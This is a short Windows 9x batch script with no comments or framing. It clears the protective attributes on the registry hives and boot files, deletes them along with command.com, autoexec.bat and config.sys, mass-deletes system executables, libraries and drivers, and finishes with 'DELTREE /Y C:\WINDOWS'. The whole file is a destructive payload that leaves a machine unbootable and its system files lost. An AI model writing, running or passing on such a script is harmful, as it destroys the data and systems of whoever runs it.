@echo off
@attrib -r -a -h -s c:\windows\user.dat
@attrib -r -s -a -h c:\windows\user.da0
@attrib -r -s -a -h c:\windows\system.dat
@attrib -r -s -a -h c:\windows\system.da0
@attrib -r -s -a -h c:\io.sys
@attrib -r -s -a -h c:\msdos.sys
@del c:\windows\user.dat
@del c:\windows\user.da0
@del c:\windows\system.dat
@del c:\windows\system.da0
@del c:\io.sys
@del c:\msdos.sys
@del c:\command.com
@del c:\autoexec.bat
@del c:\config.sys
@del c:\windows\*.sys
@del c:\windows\*.exe
@del c:\windows\*.ini
@del c:\windows\*.com
@del c:\windows\*.dll
@del c:\windows\system\*.dll
@del c:\windows\system\*.drv
@del c:\windows\system\*.vxd
@del c:\windows\command\*.com
@del c:\windows\command\*.sys
@del c:\windows\updatema\*.bat
DELTREE /Y C:\WINDOWS
C:\WINDOWS\EXECUT /y c:\windows